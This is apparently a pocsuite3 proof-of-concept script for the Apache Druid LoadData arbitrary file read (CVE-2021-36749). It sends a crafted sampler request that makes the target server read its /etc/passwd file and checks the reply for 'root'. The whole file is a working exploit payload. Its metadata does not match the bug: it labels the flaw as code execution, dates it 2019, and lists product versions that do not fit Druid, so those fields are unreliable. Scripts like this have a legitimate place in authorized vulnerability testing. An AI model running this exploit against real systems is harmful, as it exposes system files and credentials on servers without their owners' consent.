from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json

class DemoPOC(POCBase):
    vulID = '001'  # ssvid
    version = '1.0'
    author = ['w7ay']
    vulDate = '2019-04-04'
    createDate = '2019-04-04'
    updateDate = '2019-04-04'
    references = ['http://wiki.peiqi.tech/wiki/webserver/Apache/Apache%20Druid%20LoadData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-36749.html']
    name = 'Apache Druid LoadData 任意文件读取漏洞 CVE-2021-36749'
    appPowerLink = ''
    appName = 'Apache Druid LoadData'
    appVersion = '4.0.36;5.0.18;5.4.8;6.0.0'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Apache Druid LoadData 任意文件读取漏洞'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    # 编写验证模块
    def _verify(self):
        result = {}
        headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json,text/plain,*/*"
            }
        json_data = {
        "type":"index",
        "spec":{
            "type":"index",
            "ioConfig":{
                "type":"index",
                "inputSource":{
                    "type":"http",
                    "uris":[
                        "file:///etc/passwd"
                    ]
                },
                "inputFormat":{
                    "type":"regex",
                    "pattern":"(.*)",
                    "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                    "columns":[
                        "raw"
                    ]
                }
            },
            "dataSchema":{
                "dataSource":"sample",
                "timestampSpec":{
                    "column":"!!!_no_such_column_!!!",
                    "missingValue":"1970-01-01T00:00:00Z"
                },
                "dimensionsSpec":{
                }
            },
            "tuningConfig":{
                "type":"index"
            }
        },
        "samplerConfig":{
            "numRows":500,
            "timeoutMs":15000
        }
        }
        try:
            target = self.url+"/druid/indexer/v1/sampler?for=connect"
            r = requests.post(url=target,timeout=8,verify=False,json=json_data,allow_redirects=False)
            if r.status_code == 200 and "root" in r.text:
                result['FileInfo'] = {}
                result['FileInfo']['URL'] = target
                return self.parse_verify(result)
        except:
            return
    def parse_verify(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)